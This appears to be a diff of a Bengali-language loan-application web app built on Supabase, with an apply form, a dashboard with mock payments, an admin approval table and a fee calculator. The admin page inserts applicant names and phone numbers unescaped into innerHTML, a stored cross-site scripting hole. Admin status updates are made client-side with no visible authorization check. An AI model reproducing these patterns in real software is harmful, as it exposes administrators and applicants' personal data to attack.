+   6) APPLY GATE
+========================================================= */
+function updateApplyGate(){
+  const loggedIn = !!currentUser;
+  show('applyForm',       loggedIn);
+  show('applyAuthGate',  !loggedIn);
+}
+
+/* =========================================================
+   7) APPLY FORM SUBMIT  (single handler)
+========================================================= */
+$('applyForm').addEventListener('submit', async e => {
+  e.preventDefault();
+  if(!currentUser){ go('auth'); return; }
+
+  const form = e.target;
+  const msg  = $('formMsg');
+  const btn  = $('submitBtn');
+
+  if(!form.checkValidity()){
+    msg.textContent = '⚠️ অনুগ্রহ করে সব তথ্য সঠিকভাবে পূরণ করুন।';
+    msg.style.color = 'var(--danger)';
+    return;
+  }
+
+  btn.disabled = true;
+  msg.textContent = '⏳ জমা হচ্ছে...';
+  msg.style.color = 'var(--muted)';
+
+  try{
+    const fd     = new FormData(form);
+    const amount = Number(fd.get('loanAmount'));
+    const term   = Number(fd.get('term'));
+
+    // ১. profile upsert
+    const { error: pErr } = await sb.from('profiles').upsert({
+      user_id: currentUser.id,
+      full_name:      fd.get('name'),
+      phone:          fd.get('phone'),
+      nid:            fd.get('nid'),
+      occupation:     fd.get('job'),
+      monthly_income: Number(fd.get('income')),
+    }, { onConflict: 'user_id' });
+    if(pErr) throw new Error('Profile: ' + pErr.message);
+
+    // ২. loan insert
+    const { error: lErr } = await sb.from('loan_applications').insert({
+      user_id:        currentUser.id,
+      amount,
+      term_months:    term,
+      deposit_amount: amount * 0.10,
+      fee_amount:     amount * 0.10,
+      status:         'pending',
+    });
+    if(lErr) throw new Error('Loan: ' + lErr.message);
+
+    msg.textContent = '✅ আপনার আবেদন সফলভাবে জমা হয়েছে!';
+    msg.style.color = 'var(--ok)';
+    form.reset();
+    setTimeout(() => go('dashboard'), 800);
+
+  }catch(err){
+    console.error(err);
+    msg.textContent = '❌ ' + err.message;
+    msg.style.color = 'var(--danger)';
+  }finally{
+    btn.disabled = false;
+  }
+});
+
+/* =========================================================
+   8) DASHBOARD
+========================================================= */
+async function loadDashboard(){
+  const box = $('dashboardList');
+  box.innerHTML = '<div class="empty">লোড হচ্ছে...</div>';
+
+  const { data, error } = await sb.from('loan_applications')
+    .select('*')
+    .eq('user_id', currentUser.id)
+    .order('created_at', {ascending:false});
+
+  if(error){
+    box.innerHTML = `<div class="empty">❌ ${error.message}</div>`;
+    return;
+  }
+  if(!data || !data.length){
+    box.innerHTML = '<div class="empty">এখনো কোনো আবেদন নেই। "আবেদন" পেজ থেকে শুরু করুন।</div>';
+    return;
+  }
+
+  box.innerHTML = data.map(l => {
+    const emi = (l.amount + l.amount * 0.06 * (l.term_months / 12)) / l.term_months;
+    const canPay = l.status === 'disbursed' || l.status === 'approved';
+    return `
+      <div class="loan-item">
+        <div class="row">
+          <b>${tk(l.amount)} · ${toBn(l.term_months)} মাস</b>
+          <span class="badge ${l.status}">${statusBn(l.status)}</span>
+        </div>
+        <div class="row">
+          <span>EMI: <b>${tk(emi)}</b></span>
+          <span>${new Date(l.created_at).toLocaleDateString('bn-BD')}</span>
+        </div>
+        ${canPay
+          ? `<button class="btn btn-sm btn-ok"
+               onclick="makePayment('${l.id}', ${emi.toFixed(2)})">কিস্তি পরিশোধ</button>`
+          : ''}
+      </div>
+    `;
+  }).join('');
+}
+
+async function makePayment(loanId, amount){
+  if(!confirm('ডেমো পেমেন্ট নিশ্চিত করবেন? বাস্তবে bKash/Nagad গেটওয়ে লাগবে।')) return;
+  const { error } = await sb.from('payments').insert({
+    loan_id: loanId,
+    user_id: currentUser.id,
+    amount,
+    method: 'mock',
+  });
+  if(error){ alert('❌ ' + error.message); return; }
+  alert('✅ পেমেন্ট রেকর্ড হয়েছে (ডেমো)।');
+  loadDashboard();
+}
+
+/* =========================================================
+   9) ADMIN
+========================================================= */
+async function loadAdmin(){
+  const { data, error } = await sb.from('loan_applications')
+    .select(`
+      id, amount, term_months, status, created_at, deposit_amount, fee_amount,
+      profiles:user_id (full_name, phone)
+    `)
+    .order('created_at', {ascending:false});
+
+  const body = $('adminBody');
+  if(error){
+    body.innerHTML = `<tr><td colspan="7" class="empty">❌ ${error.message}</td></tr>`;
+    return;
+  }
+
+  const total    = data.length;
+  const pending  = data.filter(l => l.status === 'pending').length;
+  const approved = data.filter(l => l.status === 'approved' || l.status === 'disbursed').length;
+  const sum      = data.reduce((s,l) => s + Number(l.amount || 0), 0);
+
+  $('stTotal').textContent    = toBn(total);
+  $('stPending').textContent  = toBn(pending);
+  $('stApproved').textContent = toBn(approved);
+  $('stAmount').textContent   = tk(sum);
+
+  if(!total){
+    body.innerHTML = '<tr><td colspan="7" class="empty">কোনো আবেদন নেই।</td></tr>';
+    return;
+  }
+
+  body.innerHTML = data.map(l => {
+    const name   = l.profiles?.full_name || '—';
+    const phone  = l.profiles?.phone     || '—';
+    const date   = new Date(l.created_at).toLocaleDateString('bn-BD');
+    const acts   = [];
+
+    if(l.status === 'pending'){
+      acts.push(`<button class="btn btn-sm btn-ok"
+                   onclick="updateStatus('${l.id}','approved')">অনুমোদন</button>`);
+      acts.push(`<button class="btn btn-sm btn-danger"
+                   onclick="updateStatus('${l.id}','rejected')">বাতিল</button>`);
+    }
+    if(l.status === 'approved'){
+      acts.push(`<button class="btn btn-sm"
+                   onclick="updateStatus('${l.id}','disbursed')">বিতরণ</button>`);
+    }
+
+    return `<tr>
+      <td>${name}</td>
+      <td>${phone}</td>
+      <td>${tk(l.amount)}</td>
+      <td>${toBn(l.term_months)} মাস</td>
+      <td><span class="badge ${l.status}">${statusBn(l.status)}</span></td>
+      <td>${date}</td>
+      <td><div class="actions">${acts.join('') || '—'}</div></td>
+    </tr>`;
+  }).join('');
+}
+
+async function updateStatus(id, status){
+  if(!confirm('স্ট্যাটাস পরিবর্তন করবেন?')) return;
+  const { error } = await sb.from('loan_applications').update({status}).eq('id', id);
+  if(error){ alert('❌ ' + error.message); return; }
+  loadAdmin();
+}
+
+/* =========================================================
+   10) CALCULATOR
+========================================================= */
+const RATE = 0.06;  // বার্ষিক ফ্ল্যাট সুদ
+const DEP  = 0.10;  // নিরাপত্তা আমানত
+const FEE  = 0.10;  // প্রসেসিং ফি
+
+const calcState = { amount: 10000, months: 12 };
+
+function recalc(){
+  const a = calcState.amount;
+  const m = calcState.months;
+
+  const interest = a * RATE * (m / 12);
+  const total    = a + interest;
+  const emi      = total / m;
+  const deposit  = a * DEP;
+  const fee      = a * FEE;
+  const net      = a - deposit - fee;
+
+  $('amountDisplay').textContent = tk(a);
+  $('bAmount').textContent   = tk(a);
+  $('bDeposit').textContent  = tk(deposit);
+  $('bFee').textContent      = tk(fee);
+  $('bNet').textContent      = tk(net);
+  $('bInterest').textContent = tk(interest);
+  $('bTotal').textContent    = tk(total);
+  $('bEmi').textContent      = tk(emi);
+}
+
+$('amount').addEventListener('input', e => {
+  calcState.amount = +e.target.value;
+  recalc();
+});
+
+document.querySelectorAll('#termBtns button').forEach(btn => {
+  btn.addEventListener('click', () => {
+    document.querySelectorAll('#termBtns button')
+      .forEach(b => b.classList.remove('active'));
+    btn.classList.add('active');
+    calcState.months = +btn.dataset.m;
     recalc();
   });
+});
 
-  document.querySelectorAll('#termBtns button').forEach(btn => {
-    btn.addEventListener('click', () => {
-      document.querySelectorAll('#termBtns button')
-        .forEach(b => b.classList.remove('active'));
-      btn.classList.add('active');
-      state.months = +btn.dataset.m;
-      recalc();
-    });
-  });
-
-  /* ---------- Form Submit (ডেমো) ---------- */
-  $('applyForm').addEventListener('submit', e => {
-    e.preventDefault();
-    const form = e.target;
-    const msg  = $('formMsg');
-
-    if (!form.checkValidity()){
-      msg.textContent = '⚠️ অনুগ্রহ করে সব তথ্য সঠিকভাবে পূরণ করুন।';
-      msg.className = 'msg';
-      msg.style.color = 'var(--danger)';
-      return;
-    }
-
-    msg.textContent = '✅ ধন্যবাদ! আপনার আবেদন জমা হয়েছে (ডেমো)। বাস্তব সার্ভারে পাঠানো হয়নি।';
-    msg.className = 'msg ok';
-    msg.style.color = '';
-    form.reset();
-  });
-
-  /* ---------- Init ---------- */
-  recalc();
+/* =========================================================
+   11) INIT
+========================================================= */
+recalc();
+go('home');
 </script>
 
-</body> <script>
-  // আপনার Supabase প্রজেক্ট URL এবং anon key এখানে বসান
-  const SUPABASE_URL = 'https://dtwdwcfbxbchcwjqgwel.supabase.co';
-  const SUPABASE_ANON_KEY = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImR0d2R3Y2ZieGJjaGN3anFnd2VsIiwicm9sZSI6ImFub24iLCJpYXQiOjE3OTUyODI3NDIsImV4cCI6MjExMDg1ODc0Mn0._YYJrVVjDwm0sXwQJn5ik5zBaK6YN1KUmzSQ_uiJSqw';
-
-  const supabase = window.supabase.createClient(SUPABASE_URL, SUPABASE_ANON_KEY);
-
-  // ফর্ম সাবমিট ইভেন্ট
-  document.getElementById('applyForm').addEventListener('submit', async (e) => {
-    e.preventDefault();
-    const form = e.target;
-    const msg = document.getElementById('formMsg');
-
-    // ১. প্রথমে ইউজার সাইন-ইন করান (ডেমোতে 익익명 সাইন-ইন)
-    // বাস্তবে ইমেইল/পাসওয়ার্ড লগইন ব্যবহার করবেন
-    const { data: { user }, error: authError } = await supabase.auth.signInAnonymously();
-    if (authError) {
-      msg.textContent = '❌ লগইন ব্যর্থ: ' + authError.message;
-      msg.style.color = 'var(--danger)';
-      return;
-    }
-
-    // ২. ফর্ম ডেটা সংগ্রহ
-    const formData = new FormData(form);
-    const profileData = {
-      user_id: user.id,
-      full_name: formData.get('name'),
-      phone: formData.get('phone'),
-      nid: formData.get('nid'),
-      occupation: formData.get('job'),
-      monthly_income: Number(formData.get('income')),
-    };
-
-    // ৩. প্রোফাইল টেবিলে ডেটা ইনসার্ট
-    const { error: profileError } = await supabase.from('profiles').insert(profileData);
-    if (profileError) {
-      msg.textContent = '❌ প্রোফাইল সংরক্ষণে ত্রুটি: ' + profileError.message;
-      msg.style.color = 'var(--danger)';
-      return;
-    }
-
-    // ৪. লোন আবেদন টেবিলে ডেটা ইনসার্ট
-    const loanAmount = Number(formData.get('loanAmount').replace(/,/g, ''));
-    const loanData = {
-      user_id: user.id,
-      amount: loanAmount,
-      term_months: 12, // স্লাইডার থেকে ডাইনামিকভাবে নিতে পারেন
-      deposit_amount: loanAmount * 0.10,
-      fee_amount: loanAmount * 0.10,
-    };
-
-    const { error: loanError } = await supabase.from('loan_applications').insert(loanData);
-    if (loanError) {
-      msg.textContent = '❌ লোন আবেদন সংরক্ষণে ত্রুটি: ' + loanError.message;
-      msg.style.color = 'var(--danger)';
-      return;
-    }
-
-    // সফলতা
-    msg.textContent = '✅ আপনার আবেদন সফলভাবে জমা হয়েছে! (Supabase-এ সংরক্ষিত)';
-    msg.className = 'msg ok';
-    form.reset();
-  });
-</script>
+</body>
 </html>
